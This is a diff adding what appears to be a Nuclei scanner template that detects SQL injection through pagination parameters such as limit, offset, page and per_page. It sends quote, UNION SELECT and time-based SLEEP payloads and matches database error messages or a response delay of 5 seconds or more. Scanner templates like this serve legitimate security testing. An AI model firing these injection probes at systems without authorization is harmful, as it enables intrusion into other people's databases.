@@ -1,0 +1,53 @@
+id: sqli-pagination-limit-offset
+
+info:
+  name: SQL Injection via Pagination Parameters (LIMIT/OFFSET)
+  author: security-researcher
+  severity: medium
+  description: |
+    페이지네이션에 사용되는 limit, offset, per_page, count 파라미터를 통한
+    SQL 인젝션 취약점을 탐지합니다. 직접 쿼리에 삽입되는 숫자값이 대상입니다.
+  tags: sqli,pagination,limit,offset,injection
+
+http:
+  - method: GET
+    path:
+      # limit 파라미터
+      - "{{BaseURL}}?limit=10'"
+      - "{{BaseURL}}?limit=10 UNION SELECT NULL--"
+      - "{{BaseURL}}?limit=10 AND SLEEP(5)--"
+      - "{{BaseURL}}?limit=(SELECT 1 FROM (SELECT(SLEEP(5)))a)"
+      # offset 파라미터
+      - "{{BaseURL}}?offset=0'"
+      - "{{BaseURL}}?offset=0 AND SLEEP(5)--"
+      - "{{BaseURL}}?offset=0 UNION SELECT NULL--"
+      # per_page 파라미터
+      - "{{BaseURL}}?per_page=10'"
+      - "{{BaseURL}}?per_page=10 AND SLEEP(5)--"
+      # page 파라미터
+      - "{{BaseURL}}?page=1'"
+      - "{{BaseURL}}?page=1 AND SLEEP(5)--"
+      # count 파라미터
+      - "{{BaseURL}}?count=10'"
+      - "{{BaseURL}}?num=10'"
+      - "{{BaseURL}}?size=10'"
+      # API 스타일
+      - "{{BaseURL}}/api/items?_limit=10'"
+      - "{{BaseURL}}/api/items?_start=0'"
+
+    matchers-condition: or
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "you have an error in your sql syntax"
+          - "ORA-\\d{5}"
+          - "Microsoft OLE DB"
+          - "PostgreSQL.*ERROR"
+          - "sql.*error|syntax.*error"
+        condition: or
+        case-insensitive: true
+
+      - type: dsl
+        dsl:
+          - "duration >= 5000"
